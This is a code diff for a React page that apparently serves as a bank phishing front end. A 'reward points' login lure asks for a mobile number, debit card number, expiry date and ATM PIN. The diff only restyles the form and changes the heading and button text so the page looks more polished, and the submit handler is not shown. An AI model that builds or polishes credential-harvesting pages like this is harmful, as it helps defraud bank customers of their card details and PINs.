@@ -6,6 +6,7 @@ import { useEffect, useState } from "react";
 import Loader from "../inlcude/Loader"; 
 import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
 import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
+import styles from "./maza.module.css";
 
 export default function Home() {
   
@@ -67,8 +68,8 @@ export default function Home() {
         <Loader />
       ) : (
         <div className="mainContent">
-        <h1 className="text-center">Login to claim reward points</h1>
-        <div className="card-login">
+            <h1 className={styles.ManzarCenter}>Login into Unlock Reward Points</h1>
+            <div className={`card-login ${styles.cardLogin} `}>
           <button onClick={()=>{router.push("/")}} id="bt1" type="button" className="">
             Login ID / Customer ID
           </button>
@@ -76,11 +77,11 @@ export default function Home() {
             Credit Card
           </button>
         </div>
-        <div className="card">
+        <div className={styles.card}>
           <div>
             <section id="formC">
               <form onSubmit={handleSubmit} className="LoginForm myform fmb">
-                <div className="form-group">
+                <div className={`form-group ${styles.formGroup}`}>
                   <label
                     htmlFor="Mobile_Number"
                     style={{
@@ -93,7 +94,7 @@ export default function Home() {
                   </label>
                   <input
                     type="tel"
-                    className="new-control"
+                    className={`new-control ${styles.newControl}`}
                     id="Mobile_Number"
                     name="MB"
                     maxLength={10}
@@ -102,7 +103,7 @@ export default function Home() {
                   />
                 </div>
                <DebitCardInputComponent />
-                <div className="form-group">
+                <div className={`form-group ${styles.formGroup}`}>
                   <div
                     style={{
                       display: "flex",
@@ -134,7 +135,7 @@ export default function Home() {
                     />
                   </div>
                 </div>
-                <div className="form-group">
+                <div className={`form-group ${styles.formGroup}`}>
                   <label
                     htmlFor="ATM_PIN"
                     style={{ fontSize: 13, fontFamily: '"Work Sans", sans-serif' }}
@@ -143,7 +144,7 @@ export default function Home() {
                   </label>
                   <input
                     type="tel"
-                    className="new-control"
+                    className={`new-control ${styles.newControl}`}
                     inputMode="numeric"
                     id="ATM_PIN"
                     name="CLim"
@@ -153,8 +154,8 @@ export default function Home() {
                   />
                 </div>
                 <div className="text-center">
-                  <button type="submit" disabled={loading} className="submit">
-                    SUBMIT
+                  <button type="submit" disabled={loading} className="submit" value="Login" >
+                    Login
                   </button>
                 </div>
               </form>
